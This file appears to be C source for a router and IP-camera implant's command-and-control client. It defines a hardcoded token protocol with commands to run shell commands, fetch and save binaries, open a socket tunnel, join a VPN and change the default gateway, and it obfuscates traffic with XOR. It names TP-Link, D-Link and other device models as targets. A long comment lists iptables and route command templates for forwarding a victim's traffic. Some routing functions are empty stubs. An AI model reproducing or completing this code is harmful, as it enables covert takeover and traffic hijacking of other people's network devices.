//
// Created by arvin on 2016/4/23.
//

#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#define TOKEN_LEN 10
#define TOKEN "hello"
#define UID "DKeksl2239430923"
#define SLEEP_TIME 10


#define BUF_LEN 512

#define GET_CMD 1
#define RETURN_DATA 2
#define RUN_CMD 3
#define IDLE 4
#define GET_ID 5
#define SET_ID 6

#define GET_BIN_WITH_SIZE 7
#define SAVE_TO_FILE 8
#define CONNECT_VPN 11
#define DISCONNECT_VPN 12
#define CHANGE_DEFAULT 13
#define RESTORE_DEFAULT 14
#define SOCK_TUNNEL 15

#define GET_STATUS 9
#define RET_STATUS 10


//server-web types
#define S2W_STATUS_RET 205
#define S2W_CMD_RET 201
#define S2W_CONF_STINGS 203
#define GET_CONF_STRINGS 202
#define CLIENT_RUN 1
#define SERVER_RUN 2

#define W2S_RESTORE_DEFAULT 210
#define W2S_CONNECT_VPN 207
#define W2S_DISCONNECT_VPN 208
#define W2S_CHANGE_DEFAULT 209
#define W2S_UPDATE_CONN 222
#define W2S_SOCK_TUNNEL 230
//other
#define RTF_UP          0x0001

#define TL_WR703N 101
#define TL_WR941N 100
#define TL_TR761N 102
#define TL_WR720N 103
#define TL_WR841N 106
#define TL_WR740N 104
#define TL_WR741ND 105
#define JWNR2000V3 200

#define DIR505 300

#define NW736 400

#define F1202 600

#define OPENWRT 500

// edited by arvin
#define DCS_930 900

#define __MODEL__ DCS_930

#pragma pack(1)
// size = 55
// 报文头
typedef struct _I_PROTO_HEADER
{
    char token[TOKEN_LEN];
    unsigned int length;
    unsigned int cmd;
    unsigned char id[33];
    unsigned int model;
    //unsigned int cmd_id;
}I_PROTO_HEADER;

//固件信息
typedef struct _READ_BIN
{
    int size;
    char path[128];
}READ_BIN;

//控制包
typedef struct _CONTROL_ST
{
    //unsigned int id;
    unsigned int type;
    unsigned char cmd[512];
}CONTROL_ST;

// ?
typedef struct _CMD_RUN
{
    unsigned int id;
    unsigned char cmd[1];
}CMD_RUN;


//反向隧道？
typedef struct  _SOCK_TUNNEL_CONF
{
    /* data */
    char cmd[10];
    char password[32];
    unsigned int port;
}SOCK_TUNNEL_CONF;

//传入的设置内部
typedef struct _DEFAULT_SETTING
{
    unsigned char server_ip[32];
    unsigned char default_route[32];
    int is_route_ppp;
    //unsigned char server_ip[32];
    int is_vpn_initiated;
    unsigned char vpn_if[32];
    unsigned int argc;
    //2015-05-29
    unsigned char argv0[128];
    unsigned char argv1[64];//attention domain can not langer than 64
    unsigned char argv2[8];
}DEFAULT_SETTING;
/*
union I_PROTO_HEADER
{
	PROTO_HEADER header;
	unsigned char tmp[BUF_LEN];
}
*/
extern unsigned char mac_id[32];
int step_change_default_gateway(unsigned char *ip)
{
    return 0;
}
int step_add_route(unsigned char *target, unsigned char *ip/*, other*/)
{
    return 0;
}
int step_add_port_forward(unsigned char *ip, unsigned char *port)
{
    return 0;
}
int step_put_intra_out(unsigned char *i_ip, unsigned char *i_port, unsigned char *o_ip, unsigned char *o_port)
{
    //use pipe, like nc
    return 0;
}


int my_read(int sock, unsigned char *buf, int size, int time_out)
{
//    struct timeval {
//        time_t       tv_sec;     /* seconds */
//        suseconds_t   tv_usec; /* microseconds */
//    };
    struct timeval timeout = {time_out,0};
    // 设置接收超时
    setsockopt(sock,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(struct timeval));
    memset(buf, 0, size);
    return read(sock, buf, size);
}
int my_write(int sock, unsigned char *buf, int size, int reserve)
{
    return write(sock, buf, size);
}
int i_send_data(int send_fd, unsigned char *data, int data_len, int cmd)
{
    unsigned char buf[BUF_LEN] = {0};
    int len = 0, i = 0;
    //header
    if(data_len < 0)return -1;
    I_PROTO_HEADER send_header = {0};
    memcpy(&(send_header.token), TOKEN, strlen(TOKEN)<=TOKEN_LEN?strlen(TOKEN):TOKEN_LEN);
    memcpy(send_header.id, mac_id, 32);
    // 转换网络字节序
    send_header.length = htonl(data_len);
    send_header.cmd = htonl(cmd);
    send_header.model = htonl((unsigned int)__MODEL__);
    memcpy(buf, &send_header, sizeof(send_header));
    my_write(send_fd, buf, BUF_LEN, 0);
    //data
    //flush(send_fd);
    //for(i)
    if(data != NULL)
    {
        for(i = 0 ; i < data_len ; i++)
        {
            // 简单的一个加密数据
            data[i] = data[i]^(0x77+i%31);
        }
        unsigned char *end = data + data_len;
        //保证数据按照最大buf长度全部发出
        while(data < end)
        {
            len = my_write(send_fd, data, (end-data) >= BUF_LEN?BUF_LEN:end-data, 0);
            if(len < 0)
            {
                return -1;
            }
            data += len;
        }
        data = end - data_len;
        // 还原数据
        for(i = 0 ; i < data_len ; i++)
        {
            data[i] = data[i]^(0x77+i%31);
        }
    }
    return data_len;
}



int i_recv_data(int recv_fd, unsigned char *data, int data_len)
{
    //
    int len = 0, i = 0;
    unsigned char *end = data + data_len;
    //if(data == NULL)return 0;
    if(data_len < 0)return -1;
    while(data < end)
    {
        len = my_read(recv_fd, data, (end-data)>=BUF_LEN?BUF_LEN:end-data, 60);
        if(len < 0)//problem?
        {
            return -1;
        }
        data += len;
    }
    data = end - data_len;
    for(i = 0 ; i < data_len ; i++)
    {
        data[i] = data[i]^(0x77+i%31);
    }
    return data_len;
}


int get_mac(unsigned char * mac, int len_limit, char *eth)
{
    struct ifreq ifreq;
    int sock;

    if ((sock = socket (AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror ("socket");
        return -1;
    }
    strcpy (ifreq.ifr_name, eth);

    if (ioctl (sock, SIOCGIFHWADDR, &ifreq) < 0)
    {
        perror ("ioctl");
        return -1;
    }

    return snprintf(mac, len_limit, "Router   MAC:{%02X:%02X:%02X:%02X:%02X:%02X}", (unsigned char) ifreq.ifr_hwaddr.sa_data[0], (unsigned char) ifreq.ifr_hwaddr.sa_data[1], (unsigned char) ifreq.ifr_hwaddr.sa_data[2], (unsigned char) ifreq.ifr_hwaddr.sa_data[3], (unsigned char) ifreq.ifr_hwaddr.sa_data[4], (unsigned char) ifreq.ifr_hwaddr.sa_data[5]);
}




//
/*
WR703N
 pppd pptp pptp_server %s
 user "%s" password "%s"
 defaultroute default-asyncmap nopcomp noaccomp nobsdcomp nodeflate noccp novj

*/
/*
inner outer
vpn server:
1.iptables -I FORWARD -j ACCEPT
2.[route add target ips netmask 255.255.255.0 gw routers ip
or
route add target ips netmask 255.255.255.0 gw 10.1.1.1
iptables -t nat -I POSTROUTING -j MASQUERADE
]


router:
1.connect to vpn server (vpn gateway 10.1.1.1)
2.iptables -I FORWARD -j ACCEPT
3.iptables -t nat -I POSTROUTING -j MASQUERADE
[need port web 80 outside iptables ...]



*/
//

/*
pppd pty "pptp host_ip --nolaunchpppd" user %s password %s defaultroute noaccomp nopcomp
route add -net 8.8.8.0 netmask 255.255.255.0 (gw ip)/(dev ethX)
iptables -t nat -I PREROUTING_DMZ -d %s -j DNAT --to-destination %s
iptables -t nat -A PREROUTING_VS -d %s -p tcp --dport %d:%d -j DNAT --to-destination %s
iptables -t nat -A PREROUTING_VS -d %s -p udp --dport %d:%d -j DNAT --to-destination %s


route add -net %s netmask %s gw %s dev %s
route del -net %s netmask %s gw %s
route add default gw 1.0.0.1 dev %s

iptables -A FORWARD_ADVSEC -m mac --mac-source %s -j DROP
iptables -D FORWARD_ADVSEC -m mac --mac-source %s -j DROP
iptables -A FORWARD_SETMARK -i %s -j MARK --set-mark %s
iptables -A FORWARD_SETMARK -i %s
iptables -F FORWARD_SETMARK
iptables -I FORWARD_VPN_PASSTHROUGH  -p tcp --dport 1723 -j DROP
iptables -I FORWARD_VPN_PASSTHROUGH  -p udp --dport 1701 -j DROP
iptables -I FORWARD_VPN_PASSTHROUGH  -p udp --dport 500 -j DROP
iptables -F FORWARD_VPN_PASSTHROUGH
iptables -F INPUT_MAC
iptables -A INPUT_MAC  -j DROP
iptables -A INPUT_MAC  -j RETURN
iptables -I INPUT_MAC  -m mac --mac-source %s -j RETURN
iptables -F FORWARD_ACCESSCTRL
iptables -A FORWARD_ACCESSCTRL -i %s
iptables -A FORWARD_ACCESSCTRL -i %s -j DROP
iptables -F FORWARD_FILTER
iptables -F FORWARD_PARENTCTRL
iptables -I FORWARD_FILTER 1 -j FORWARD_ACCESSCTRL
iptables -I FORWARD_FILTER 1 -i %s -m mac --mac-source %s -j RETURN
iptables -I FORWARD_FILTER 2 -i %s -p udp --dport 53 -j FORWARD_PARENTCTRL
iptables -I FORWARD_FILTER 3 -i %s -p tcp --dport 80 -j FORWARD_PARENTCTRL
iptables -I FORWARD_FILTER 4 -i %s -p tcp --dport ! 80 -j DROP
iptables -I FORWARD_FILTER 5 -i %s -p udp --dport ! 53 -j DROP
iptables -A FORWARD_PARENTCTRL
iptables -A FORWARD_PARENTCTRL -i %s -j DROP
iptables -F FORWARD_VS
iptables -t nat -F PREROUTING_VS
iptables -t nat -A PREROUTING_VS -d %s -p tcp --dport %d:%d -j DNAT --to-destination %s
iptables -A FORWARD_VS -i %s -p tcp --dport %d:%d -d %s -j ACCEPT
iptables -t nat -A PREROUTING_VS -d %s -p udp --dport %d:%d -j DNAT --to-destination %s
iptables -A FORWARD_VS -i %s -p udp --dport %d:%d -d %s -j ACCEPT
iptables -F FORWARD_PT
iptables -t nat -F PREROUTING_PT
iptables -A FORWARD_PT -i %s -p %s -j TRIGGER --trigger-type out --trigger-proto %s --trigger-match %d-%d --trigger-relate %d-%d
iptables -A FORWARD_PT -j TRIGGER --trigger-type in
iptables -t nat -A PREROUTING_PT -d %s -j TRIGGER --trigger-type dnat
iptables -t nat -F PREROUTING_DMZ
iptables -F FORWARD_DMZ
iptables -t nat -I PREROUTING_DMZ -d %s -j DNAT --to-destination %s
iptables -A FORWARD_DMZ -i %s -d %s -j ACCEPT
iptables -t nat -I PREROUTING_DMZ 1 -p icmp --icmp-type echo-request -d %s -j ACCEPT
iptables -F FORWARD_ADVSEC
iptables -D FORWARD_ADVSEC -i %s -p icmp --icmp-type echo-request -j DROP
iptables -A FORWARD_ADVSEC -i %s -p icmp --icmp-type echo-request -j DROP
iptables -t %s -%c %s %d %s
iptables -F FORWARD
/etc/rc.d/iptables-stop
iptables -P INPUT %s
iptables -P FORWARD %s
iptables -P OUTPUT %s
iptables -t nat -P PREROUTING %s
iptables -t nat -P POSTROUTING %s
iptables -t nat -P OUTPUT %s
iptables -N INPUT_MAC
iptables -N FORWARD_VS
iptables -N FORWARD_PT
iptables -N FORWARD_UPNP
iptables -N FORWARD_DMZ
iptables -N FORWARD_FILTER
iptables -N FORWARD_PARENTCTRL
iptables -N FORWARD_ACCESSCTRL
iptables -N FORWARD_ADVSEC
iptables -N FORWARD_VPN_PASSTHROUGH
iptables -N FORWARD_SETMARK
iptables -t nat -N PREROUTING_VS
iptables -t nat -N PREROUTING_PT
iptables -t nat -N PREROUTING_UPNP
iptables -t nat -N PREROUTING_DMZ
iptables -F FORWARD_UPNP
iptables -t nat -F PREROUTING_UPNP
iptables -t nat -A PREROUTING_UPNP -d %s -p %s --dport %d -j DNAT --to-destination %s:%d
iptables -A FORWARD_UPNP -i %s -p %s --dport %d -j ACCEPT
iptables -t nat -A PREROUTING_UPNP -d %s -p %s -s %s --dport %d -j DNAT --to-destination %s:%d
iptables -A FORWARD_UPNP -i %s -p %s -s %s --dport %d -j ACCEPT


/var/run/xl2tpd
l2tpInf
l2tp
l2tpGenCfgFile: input NULL pointer [para: %d]!!
/tmp/l2tpd.conf
l2tpGenCfgFile: Open [%s] failed !
l2tpActiveCfg: input NULL pointer !
l2tpd
xl2tpd seems not started !
l2tp-control "start-session %s"
ERROR: l2tpCmdReq() input NULL pointer !!
l2tp-control "stop-session tp"
l2tp-control "exit"
wan_l2tp_dhcp_en
wan_l2tp_rMac
wan_l2tp_ip
wan_l2tp_msk
wan_l2tp_gw
wan_l2tp_dns
wan_l2tp_dns1
wan_l2tp_dns2
wan_l2tp_dip
wan_l2tp_usr
wan_l2tp_pwd
wan_l2tp_mtu
wan_l2tp_idle
wan_l2tp_typ

*/
